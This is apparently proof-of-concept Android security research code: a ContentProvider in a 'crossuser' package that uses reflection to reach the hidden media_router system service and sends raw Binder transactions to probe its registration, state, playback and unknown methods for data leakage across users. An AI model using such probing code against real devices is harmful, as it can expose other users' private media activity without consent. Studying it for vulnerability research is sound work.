package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class RouterDeepProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder binder = getServiceBinder("media_router");
        if (binder == null) {
            cursor.addRow(new Object[]{"error", "no_binder"});
            return cursor;
        }

        String desc = "android.media.IMediaRouterService";

        // First register as client to get state
        IBinder clientBinder = new StubBinder("android.media.IMediaRouterClient");

        // Register
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(clientBinder);
            data.writeString(getContext().getPackageName());
            data.writeInt(0); // userId
            binder.transact(1, data, reply, 0);
            int ex = reply.readInt();
            cursor.addRow(new Object[]{"register", ex == 0 ? "SUCCESS" : "Ex=" + ex});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"register", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // getState after registration
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(clientBinder);
            binder.transact(3, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"getState_avail", String.valueOf(avail)});
                if (avail > 0) {
                    // MediaRouterClientState is a Parcelable
                    int nonNull = reply.readInt();
                    if (nonNull != 0) {
                        // Read routes list
                        int routeCount = reply.readInt();
                        cursor.addRow(new Object[]{"route_count", String.valueOf(routeCount)});
                        for (int i = 0; i < Math.min(routeCount, 10); i++) {
                            try {
                                // RouteInfo parcelable
                                int rNonNull = reply.readInt();
                                if (rNonNull != 0) {
                                    String id = reply.readString();
                                    String name = reply.readString();
                                    String description = reply.readString();
                                    int supportedTypes = reply.readInt();
                                    cursor.addRow(new Object[]{"route_" + i, "id=" + id + " name=" + name + " types=" + supportedTypes});
                                }
                            } catch (Exception e) {
                                cursor.addRow(new Object[]{"route_" + i, "parseErr:" + e.getMessage()});
                                break;
                            }
                        }
                    } else {
                        cursor.addRow(new Object[]{"getState", "null state"});
                    }
                }
            } else {
                cursor.addRow(new Object[]{"getState", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getState", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=12: What is this method that returns 352 bytes?
        // In IMediaRouterService: could be getSystemRoutes() or getMediaRouter2Manager?
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // minimal arg
            binder.transact(12, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"tx12_avail", String.valueOf(avail)});
                // Dump first ints
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < Math.min(avail / 4, 20); i++) {
                    sb.append(reply.readInt()).append(" ");
                }
                cursor.addRow(new Object[]{"tx12_ints", sb.toString().trim()});
            } else {
                cursor.addRow(new Object[]{"tx12", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"tx12", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Try TX=12 with package name
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeInt(0);
            binder.transact(12, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"tx12_pkg_avail", String.valueOf(avail)});
                // Try reading as strings
                reply.setDataPosition(reply.dataPosition());
                StringBuilder sb = new StringBuilder();
                try {
                    int count = reply.readInt(); // maybe list size
                    sb.append("count=").append(count).append(" ");
                    if (count > 0 && count < 100) {
                        for (int i = 0; i < Math.min(count, 5); i++) {
                            int nn = reply.readInt();
                            if (nn != 0) {
                                String s = reply.readString();
                                sb.append("[").append(s != null ? s.substring(0, Math.min(40, s.length())) : "null").append("] ");
                            }
                        }
                    }
                } catch (Exception ignored) {}
                cursor.addRow(new Object[]{"tx12_pkg_data", sb.toString().trim()});
            } else {
                cursor.addRow(new Object[]{"tx12_pkg", "Ex=" + ex + "|" + truncate(reply.readString())});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"tx12_pkg", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // TX=4: isPlaybackActive(IMediaRouterClient)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(clientBinder);
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int active = reply.readInt();
                cursor.addRow(new Object[]{"isPlaybackActive", "active=" + active});
            } else {
                cursor.addRow(new Object[]{"isPlaybackActive", "Ex=" + ex});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"isPlaybackActive", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        return cursor;
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }

    private static class StubBinder extends android.os.Binder {
        private final String descriptor;
        StubBinder(String desc) { this.descriptor = desc; attachInterface(null, desc); }
        @Override public String getInterfaceDescriptor() { return descriptor; }
        @Override protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {
            if (reply != null) reply.writeNoException();
            return true;
        }
    }
}
